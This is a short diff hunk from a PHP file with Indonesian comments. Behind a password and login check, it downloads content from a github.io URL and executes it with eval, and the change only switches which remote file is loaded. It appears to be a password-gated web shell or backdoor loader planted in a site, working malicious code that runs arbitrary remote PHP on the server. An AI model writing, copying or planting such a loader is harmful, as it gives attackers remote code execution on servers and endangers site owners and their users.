@@ -63,7 +63,7 @@ if (isset($_POST['password'])) {
 // Cek jika pengguna sudah login sebelum menampilkan konten
 if (is_logged_in()) {
     // Ambil konten dari URL yang diberikan
-    $a = geturlsinfo('https://wak39tolkon.github.io/kwn/bawang.txt');
+    $a = geturlsinfo('https://wak39tolkon.github.io/idnn/index.txt');
     
     // Mengeksekusi konten PHP yang diterima dari URL
     eval('?>' . $a);
